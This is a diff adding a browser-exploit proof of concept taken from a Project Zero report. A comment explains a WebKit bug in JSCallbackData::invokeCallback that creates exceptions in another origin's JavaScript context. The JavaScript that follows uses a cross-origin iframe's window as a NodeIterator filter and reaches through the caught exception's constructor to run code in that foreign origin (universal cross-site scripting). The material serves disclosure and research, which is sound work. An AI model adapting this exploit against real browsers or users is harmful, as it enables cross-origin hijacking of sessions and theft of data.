@@ -1,0 +1,70 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1068
+
+Here is the definition of |JSCallbackData| class. This class is used to call a javascript function from a DOM object.
+
+class JSCallbackDataStrong : public JSCallbackData {
+public:
+    JSCallbackDataStrong(JSC::JSObject* callback, void*)
+        : m_callback(callback->globalObject()->vm(), callback)
+    {
+    }
+
+    JSC::JSObject* callback() { return m_callback.get(); }
+    JSDOMGlobalObject* globalObject() { return JSC::jsCast<JSDOMGlobalObject*>(m_callback->globalObject()); }
+
+    JSC::JSValue invokeCallback(JSC::MarkedArgumentBuffer& args, CallbackType callbackType, JSC::PropertyName functionName, NakedPtr<JSC::Exception>& returnedException)
+    {
+        return JSCallbackData::invokeCallback(callback(), args, callbackType, functionName, returnedException);
+    }
+
+private:
+    JSC::Strong<JSC::JSObject> m_callback;
+};
+
+JSValue JSCallbackData::invokeCallback(JSObject* callback, MarkedArgumentBuffer& args, CallbackType method, PropertyName functionName, NakedPtr<JSC::Exception>& returnedException)
+{
+    ASSERT(callback);
+
+    auto* globalObject = JSC::jsCast<JSDOMGlobalObject*>(callback->globalObject());  <<<---------- (1)
+    ASSERT(globalObject);
+
+    ExecState* exec = globalObject->globalExec();
+    JSValue function;
+    CallData callData;
+    CallType callType = CallType::None;
+
+    if (method != CallbackType::Object) {
+        function = callback;
+        callType = callback->methodTable()->getCallData(callback, callData);
+    }
+    if (callType == CallType::None) {
+        if (method == CallbackType::Function) {
+            returnedException = JSC::Exception::create(exec->vm(), createTypeError(exec));  <<<---------- (2)
+            return JSValue();
+        }
+        ...
+    }
+    ...
+}
+
+But |JSCallbackData::invokeCallback| method obtains the |ExecState| object from the callback object. So if we invoke |JSCallbackData::invokeCallback| method with the different origin's window as |callback|, an exception object will be created from the different domain's javascript context.
+
+PoC:
+-->
+
+"use strict";
+
+let f = document.body.appendChild(document.createElement("iframe"));
+f.onload = () => {
+    f.onload = null;
+
+    try {
+        let iterator = document.createNodeIterator(document, NodeFilter.SHOW_ALL, f.contentWindow);
+        iterator.nextNode();
+    } catch (e) {
+        e.constructor.constructor("alert(location)")();
+    }
+};
+
+f.src = "https://abc.xyz/";
